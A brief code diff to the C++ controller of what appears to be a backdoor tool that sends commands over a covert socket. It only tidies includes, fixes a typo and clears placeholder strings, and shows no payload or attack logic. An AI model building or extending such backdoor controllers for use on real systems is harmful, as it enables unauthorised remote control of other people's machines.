@@ -1,9 +1,9 @@
 #include <iostream>
 #include <string.h>
+#include <pthread.h>
 
 #include "../utils/Logger.h"
 #include "CovertSocket.h"
-#include "TrafficAnalyzer.h"
 #include "NetworkMonitor.h"
 
 #define BUFFER_LENGTH 1024
@@ -66,11 +66,10 @@ int setArgs(int argc, char* argv[])
 int controlBackdoorLoop(CovertSocket covertSocket, NetworkMonitor * networkMonitor )
 {
     bool running = true;
-    std:string command;
+    std::string command;
     char commandBuffer[BUFFER_LENGTH];
-    std::string response = "TODO response";
+    std::string response;
 
-    std::cout << "Enter Commands: " << std::endl;
     while(running)
     {
         std::cout << ">";
